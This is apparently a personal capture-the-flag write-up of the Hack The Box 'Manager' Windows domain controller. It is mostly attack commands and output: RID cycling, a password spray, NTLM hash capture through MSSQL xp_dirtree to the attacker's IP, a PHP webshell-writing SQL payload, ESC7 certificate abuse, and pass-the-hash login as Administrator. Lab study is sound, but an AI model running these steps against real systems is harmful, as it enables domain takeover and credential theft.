@@ -1,0 +1,642 @@
+==
+tags: #windows #medium #rid-cycling #ad-cs #esc7 #xp_dirtree #mssql
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/manager.basic 10.129.26.140
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Manager
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-04 14:49:03Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-04T14:50:25+00:00; +15h29m49s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:dc01.manager.htb
+| Not valid before: 2024-08-30T17:08:51
+|_Not valid after:  2122-07-27T10:31:04
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?                                                                                             
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:dc01.manager.htb          
+| Not valid before: 2024-08-30T17:08:51
+|_Not valid after:  2122-07-27T10:31:04
+|_ssl-date: 2026-07-04T14:50:24+00:00; +15h29m49s from scanner time.
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-info:
+|   10.129.26.140:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-07-04T14:50:25+00:00; +15h29m49s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-07-04T14:42:52
+|_Not valid after:  2056-07-04T14:42:52
+| ms-sql-ntlm-info:
+|   10.129.26.140:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-04T14:50:25+00:00; +15h29m49s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:dc01.manager.htb
+| Not valid before: 2024-08-30T17:08:51
+|_Not valid after:  2122-07-27T10:31:04
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-04T14:50:24+00:00; +15h29m49s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:dc01.manager.htb
+| Not valid before: 2024-08-30T17:08:51
+|_Not valid after:  2122-07-27T10:31:04
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+  #+end_src
+  DNS is present, so this is likely a DC.
+** full scan
+   #+begin_src bat
+   sudo nmap  -p- -A -T4 -oA nmap/manager.full 10.129.26.140
+   #+end_src
+* smb
+** null session
+   #+begin_src bat
+   $ nxc smb 10.129.26.140 -u '' -p '' --shares
+
+SMB DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB DC01 [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+   #+end_src
+** guest session
+   #+begin_src bat
+   $ nxc smb 10.129.26.140 -u 'guest' -p 'tet' --shares
+
+SMB DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB DC01 [-] manager.htb\guest:tet STATUS_LOGON_FAILURE 
+   #+end_src
+** enum4linux-ng
+   #+begin_src 
+   $ enum4linux-ng 10.129.26.140 -A
+
+[*] Enumerating via unauthenticated SMB session on 445/tcp 
+[+] Found domain information via SMB                                                                                  
+NetBIOS computer name: DC01                                                                                           
+NetBIOS domain name: MANAGER                                                                                          
+DNS domain: manager.htb                                                                                               
+FQDN: dc01.manager.htb                                                                                                
+Derived membership: domain member                                                                                     
+Derived domain: MANAGER 
+   #+end_src
+* fuzz
+** vhost
+   #+begin_src bat
+   ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://manager.htb/ -H 'Host: FUZZ.manager.htb'
+   #+end_src
+   nothing; let's try gobuster with a bigger wordlist
+   #+begin_src bat
+   gobuster vhost -u http://manager.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
+   #+end_src
+*** wfuzz
+    #+begin_src bat
+    wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.26.140 -H "Host: FUZZ.manager.htb" --hc 301 --hw 1356
+    #+end_src
+    the other wordlist
+    #+begin_src 
+    wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 10.129.26.140 -H "Host: FUZZ.manager.htb" --hc 301 --hw 1356
+    #+end_src
+    finds nothing.
+** subdomain
+   #+begin_src bat
+   ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.manager.local/
+   #+end_src
+** page
+   #+begin_src bat
+   ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://manager.htb/FUZZ.html
+   #+end_src
+   nothing new
+*** with the IIS wordlist
+   #+begin_src bat
+   ffuf -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -u http://manager.htb/FUZZ.html
+   #+end_src
+** directory
+   #+begin_src bat
+   ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://manager.htb/FUZZ
+   #+end_src
+*** bigger wordlist
+    #+begin_src 
+     ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://manager.htb/FUZZ
+    #+end_src
+* dns enumeration
+  #+begin_src bat
+  dig axfr manager.htb @10.129.26.140
+
+; Transfer failed. 
+  #+end_src
+* shortname
+  #+begin_src bat
+  $ shortscan http://manager.htb/
+
+URL: http://manager.htb/                                   
+Running: Microsoft-IIS/10.0                                
+Vulnerable: Yes!                                           
+
+WEB~1.CON            WEB.CON?                              
+INDEX~1.HTM          INDEX.HTM?          INDEX.HTML        
+ABOUT~1.HTM          ABOUT.HTM?          ABOUT.HTML        
+WEBSIT~1.ZIP         WEBSIT?.ZIP?                          
+SERVIC~1.HTM         SERVIC?.HTM?        SERVICE.HTML                                                                 
+CONTAC~1.HTM         CONTAC?.HTM?        CONTACT.HTML  
+  #+end_src
+  however, neither =web.config= nor =web.conf= seem to be accessible.
+* generate wordlist to fuzz for the shortscan output
+  #+begin_src 
+  egrep -r ^con /usr/share/wordlists/* | sed 's/^[^:]*://' > /short_list.txt
+  #+end_src
+** fuzz
+  #+begin_src bat
+    ffuf -w short_list.txt:FUZZ -u http://manager.htb/web.FUZZ
+  #+end_src
+* lfi
+  #+begin_src bat
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt:FUZZ -u http://manager.htb/FUZZ
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://manager.htb/FUZZ
+  #+end_src
+* guided mode
+  #+begin_src 
+  What username has the relative identifier (RID) of 1116 on Manager?
+  #+end_src
+  hint says:
+  #+begin_src 
+  Try a RID cycling attack with a tool like lookupsid.py.
+  #+end_src
+  ok, we're definitely missing something. =impacket-lookupsid= looks like it
+  requires a valid username? apparently not
+* official solution
+  they make use of the fact that we're allowed to list shares with =smbclient=:
+  #+begin_src 
+  $ smbclient -L \\\\10.129.27.74 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+  #+end_src
+  to perform RID cycling
+  #+begin_src 
+  Generally, when we're allowed to list shares with a null session, we can
+  also leverage it to perform RID cycling and enumerate users on the box.
+  #+end_src
+** rid cycling
+  #+begin_src bat
+  $ impacket-lookupsid anonymous@manager.htb -no-pass
+
+[*] Brute forcing SIDs at manager.htb
+[*] StringBinding ncacn_np:manager.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
+498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: MANAGER\Administrator (SidTypeUser)
+501: MANAGER\Guest (SidTypeUser)
+502: MANAGER\krbtgt (SidTypeUser)
+512: MANAGER\Domain Admins (SidTypeGroup)
+513: MANAGER\Domain Users (SidTypeGroup)
+514: MANAGER\Domain Guests (SidTypeGroup)
+515: MANAGER\Domain Computers (SidTypeGroup)
+516: MANAGER\Domain Controllers (SidTypeGroup)
+517: MANAGER\Cert Publishers (SidTypeAlias)
+518: MANAGER\Schema Admins (SidTypeGroup)
+519: MANAGER\Enterprise Admins (SidTypeGroup)
+520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
+521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
+522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
+525: MANAGER\Protected Users (SidTypeGroup)
+526: MANAGER\Key Admins (SidTypeGroup)
+527: MANAGER\Enterprise Key Admins (SidTypeGroup)
+553: MANAGER\RAS and IAS Servers (SidTypeAlias)
+571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
+572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
+1000: MANAGER\DC01$ (SidTypeUser)
+1101: MANAGER\DnsAdmins (SidTypeAlias)
+1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
+1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+1113: MANAGER\Zhong (SidTypeUser)
+1114: MANAGER\Cheng (SidTypeUser)
+1115: MANAGER\Ryan (SidTypeUser)
+1116: MANAGER\Raven (SidTypeUser)
+1117: MANAGER\JinWoo (SidTypeUser)
+1118: MANAGER\ChinHae (SidTypeUser)
+1119: MANAGER\Operator (SidTypeUser)
+  #+end_src
+*** extract just the username with cut
+    #+begin_src bat
+    $ impacket-lookupsid anonymous@manager.htb -no-pass | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 
+
+Administrator
+Guest
+krbtgt
+DC01$
+Zhong
+Cheng
+Ryan
+Raven
+JinWoo
+ChinHae
+Operator
+    #+end_src
+* asreproasting
+  let's try and perform asreproasting for these users.
+  #+begin_src bat
+  nxc ldap 10.129.27.74 -u users.txt -p '' --asreproast asreproast.out -k
+
+LDAP        10.129.27.74    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (signing:None) (channel binding:Never) 
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+  #+end_src
+** impacket-GetNPUsers
+  #+begin_src 
+  impacket-GetNPUsers manager.htb/ -dc-ip 10.129.27.74 -no-pass -usersfile users.txt
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Raven doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User JinWoo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ChinHae doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Operator doesn't have UF_DONT_REQUIRE_PREAUTH set
+  #+end_src
+* guided mode
+  #+begin_src 
+  which user has the same password as their username in smaller case
+  #+end_src
+  let's convert the list to lowercase
+  #+begin_src 
+  $ cat users.txt | tr 'A-Z' 'a-z' > pass.txt
+  #+end_src
+** password spray
+   #+begin_src bat
+   nxc smb 10.129.28.38 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+[+] manager.htb\Operator:operator 
+   #+end_src
+* smb
+   #+begin_src bat
+   nxc smb 10.129.28.38 -u Operator -p operator --shares
+
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share 
+SYSVOL          READ            Logon server share 
+   #+end_src
+* evil-winrm
+  #+begin_src bat
+  evil-winrm -i 10.129.28.38 -u Operator -p operator
+  #+end_src
+  doesn't work
+* mssql
+  #+begin_src bat
+  sqsh -S 10.129.28.38 -U Operator -P operator -h
+
+login failed for user 'Operator'.
+  #+end_src
+* SYSVOL
+  #+begin_src bat
+  smbclient -U Operator -P operator //10.129.28.38/SYSVOL
+
+Failed to open /var/lib/samba/private/secrets.tdb
+_samba_cmd_set_machine_account_s3: failed to open secrets.tdb to obtain our trust credentials for WORKGROUP
+Failed to set machine account: NT_STATUS_INTERNAL_ERROR
+  #+end_src
+  this is related to the system being non-domain-joined apparently, so:
+  #+begin_src bat
+  $ smbclient -U 'Operator%operator' //10.129.28.220/SYSVOL
+  #+end_src
+  or use =-p= instead of =-P=
+  this contains a =manager.htb= directory with a =Policies= subdirectory:
+  #+begin_src 
+  $ tree Policies         
+
+Policies
+|- {31B2F340-016D-11D2-945F-00C04FB984F9}
+|   |- GPT.INI
+|   |- MACHINE
+|   |   |- Microsoft
+|   |   |   - Windows NT
+|   |   |       - SecEdit
+|   |   |           - GptTmpl.inf
+|   |   |- Registry.pol
+|   |   - Scripts
+|   |       |- Shutdown
+|   |       - Startup
+|   |- USER
+|- {6AC1786C-016F-11D2-945F-00C04fB984F9}
+    |- GPT.INI
+    |- MACHINE
+    |   - Microsoft
+    |       - Windows NT
+    |           - SecEdit
+    |               - GptTmpl.inf
+    |- USER
+
+16 directories, 5 files
+  #+end_src
+** automated search with nxc for gpp_objects
+   from the [[file:c:/Users/shyam/Documents/code/htb/academy/modules/using-crackmapexec/searching-for-accounts-in-group-policy-objects.org::*overview][module]]
+   #+begin_src 
+   smb 10.129.28.38 -u Operator -p operator -M gpp_password
+
+Searching for potential XML files containing passwords
+   #+end_src
+   fails here
+* bloodhound
+  #+begin_src 
+  rusthound-ce -u Operator -p 'operator' -d 'manager.htb' -c All --zip
+  #+end_src
+  the =operator= user is not part of the remoting group
+* impacket-mssql
+  tried to give this another shot and it worked - *with local auth*
+  #+begin_src 
+  $ impacket-mssqlclient Operator:operator@manager.htb -windows-auth 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (MANAGER\Operator  guest@master)>
+  #+end_src
+** db enumeration
+  #+begin_src sql
+  > SELECT name FROM master.dbo.sysdatabases
+
+name
+------
+master
+tempdb
+model
+msdb
+  #+end_src
+  only the default dbs are available so let's try =xp_cmdshell=
+  #+begin_src sql
+  > enable_xp_cmdshell                                                                                                                                                                                    
+ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action
+  #+end_src
+  after doing all the techniques in the [[file:c:/Users/shyam/Documents/code/htb/academy/modules/attacking-common-services/attacking-sql-db.org::*mssql][attacking-sql-db]] section one after the
+  other, hit the jackpot with stealing the [[file:c:/Users/shyam/Documents/code/htb/academy/modules/attacking-common-services/attacking-sql-db.org::*capture MSSQL service hash][mssql service hash]]:
+  set up responder:
+  #+begin_src 
+  sudo responder -I tun0
+  #+end_src
+  =xp_dirtree=:
+  #+begin_src sql
+   > EXEC master..xp_dirtree '\\10.10.16.179\share\'
+  #+end_src
+  and we get the ntlm hash:
+  #+begin_src 
+  DC01$::MANAGER:9283cee4ce
+  #+end_src
+  gemini says it can't be cracked:
+  #+begin_src 
+  this hash belongs to the Domain Controller machine account itself and cannot
+  be cracked since it's automatically generated and complex
+  #+end_src
+*** try to crack the hash
+    #+begin_src bat
+    hashcat -a 0 -m 5600 manager.hash /usr/share/wordlists/rockyou.txt
+    #+end_src
+    this fails.
+** impersonation
+   #+begin_src sql
+   SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+   #+end_src
+** write a file
+   #+begin_src sql
+   SQL (MANAGER\Operator  guest@master)>  DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'; EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE
+
+ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'sp_OACreate', database 'mssqlsystemresource', schema 'sys'.
+ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'sp_OAMethod', database 'mssqlsystemresource', schema 'sys'.
+ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'sp_OAMethod', database 'mssqlsystemresource', schema 'sys'.
+ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'sp_OADestroy', database 'mssqlsystemresource', schema 'sys'.
+ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'sp_OADestroy', database 'mssqlsystemresource', schema 'sys'.
+   #+end_src
+* certipy-ad
+  #+begin_src bat
+  certipy-ad find -u 'Operator' -p 'operator' -dc-ip 10.129.28.220 -target manager.htb -vulnerable
+  #+end_src
+  got gemini to analyze the output, and it turns out this might be vulnerable
+  to ESC7 via the =Raven= user.
+* guided mode
+  #+begin_src 
+  What is the MSSQL procedure that allows for reading files from the file system?
+  #+end_src
+  ok, so =xp_dirtree= can be used to list local directories as well.
+  #+begin_src sql
+  SQL (MANAGER\Operator  guest@master)> xp_dirtree c:
+
+subdirectory                depth   file
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0
+Documents and Settings          1      0
+inetpub                         1      0
+PerfLogs                        1      0
+Program Files                   1      0
+Program Files (x86)             1      0
+ProgramData                     1      0
+Recovery                        1      0
+SQL2019                         1      0
+System Volume Information       1      0
+Users                           1      0
+Windows                         1      0
+
+  SQL (MANAGER\Operator  guest@master)> xp_dirtree c:\Users
+
+subdirectory    depth   file      
+-------------   -----   ----      
+Administrator       1      0
+All Users           1      0
+Default             1      0
+Default User        1      0
+Public              1      0
+Raven               1      0
+
+  SQL (MANAGER\Operator  guest@master)> xp_dirtree c:\Users\raven
+
+subdirectory   depth   file
+------------   -----   ----
+  #+end_src
+  ok, let's try looking at the webserver directory:
+  #+begin_src sql
+  SQL (MANAGER\Operator  guest@master)> xp_dirtree c:\inetpub\wwwroot
+
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+contact.html                          1      1   
+css                                   1      0   
+images                                1      0   
+index.html                            1      1   
+js                                    1      0   
+service.html                          1      1   
+web.config                            1      1   
+website-backup-27-07-23-old.zip       1      1   
+  #+end_src
+  accessing the backup directory via the browser, we find there's an xml file
+  called =old-conf.xml= with the following contents:
+  #+begin_src xml
+<ldap-conf>
+<server>
+<host>dc01.manager.htb</host>
+<open-port enabled="true">389</open-port>
+<secure-port enabled="false">0</secure-port>
+<search-base>dc=manager,dc=htb</search-base>
+<server-type>microsoft</server-type>
+<access-user>
+<user>raven@manager.htb</user>
+<password>R4v3nBe5tD3veloP3r!123</password>
+</access-user>
+<uid-attribute>cn</uid-attribute>
+</server>
+<search type="full">
+<dir-list>
+<dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+</dir-list>
+</search>
+</ldap-conf>
+  #+end_src
+* user flag
+ #+begin_src bat
+ $ evil-winrm -i 10.129.29.96 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
+
+ *Evil-WinRM* PS C:\Users\Raven\Desktop> cat user.txt
+542f4b9206b20090dbb985ef1d527f14
+ #+end_src
+* privesc
+** back to certipy
+   should run the =vulnerable= check with certipy again with =raven's= creds. the
+   below steps are entirely gemini
+*** Step 1 - Promote Your Account to CA Administrator
+    #+begin_src bat
+    $ certipy-ad ca -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -add-officer 'Raven'
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+    #+end_src
+*** Step 2 - Enable the SubCA Template
+    #+begin_src 
+    certipy-ad ca -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -enable-template 'SubCA'
+[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+    #+end_src
+*** Step 3 - Request a Fake Certificate
+    Request a certificate using the newly enabled SubCA template. This request
+    will initially be denied or held for approval by the system - which is
+    expected behavior for a SubCA request.
+    #+begin_src bat
+    $ certipy-ad req -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -template 'SubCA' -upn 'Administrator@manager.htb'
+
+[*] Requesting certificate via RPC
+[*] Request ID is 19
+[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+Would you like to save the private key? (y/N): y
+[*] Saving private key to '19.key'
+[*] Wrote private key to '19.key'
+[-] Failed to request certificate
+    #+end_src
+    *Note the Private Key ID / Request ID provided in the terminal output when*
+    *it gets held*. here, it's *19*
+*** Step 4 - Issue the Denied Certificate
+    #+begin_src bat
+    $ certipy-ad ca -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -issue-request 19
+[-] Access denied: Insufficient permissions to issue certificate
+    #+end_src
+    turns out we just have to repeat step 1 again
+    #+begin_src bat
+    certipy-ad ca -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -add-officer 'Raven'
+
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+    #+end_src
+    #+begin_src 
+    $ certipy-ad ca -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -issue-request 19
+
+[*] Successfully issued certificate request ID 19
+    #+end_src
+*** Step 5 - Download the Admin Certificate
+    #+begin_src bat
+    $ certipy-ad req -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.29.96 -ca 'manager-DC01-CA' -retrieve 19
+
+[*] Retrieving certificate with ID 19
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'Administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '19.key'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+    #+end_src
+*** step 6 - use the administrator.pfx certificate to get the RC4 hash of the Administrator user
+    #+begin_src bat
+    certipy-ad auth -pfx administrator.pfx -domain 'manager.htb' -dc-ip 10.129.29.96
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@manager.htb'
+[*] Using principal: 'administrator@manager.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+    #+end_src
+* admin flag
+  #+begin_src bat
+  $ evil-winrm -i 10.129.29.96 -u administrator -H ae5064c2f62317332c88629e025924ef
+
+,*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+ad4bc331652a742653e7b0b4fc1fda66
+  #+end_src
+* ippsec
+  - "whenever i see mssql, i think of kerberoasting (because of the service acc.)"
+** username enumeration
+   it's possible to do enumeration via some random username list and kerbrute:
+   #+begin_src bat
+   kerbrute userenum --dc 10.129.29.96 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+ryan@manager.htb
+guest@manager.htb
+raven@manager.htb
+<SNIP>
+   #+end_src
+*** verify with nxc
+    #+begin_src bat
+    nxc smb 10.129.29.96 -k -u 'ryan' -p ''
+    #+end_src
+    if the user exists, we get a *KDC_ERR_PREAUTH_FAILED*; otherwise we get a
+    *KDC_ERR_C_PRINCIPAL_UNKNOWN*
+** rid bruteforcing with nxc
+   #+begin_src bat
+   nxc smb 10.129.29.96 -u 'guest' -p '' --rid-brute
+   #+end_src
+ 
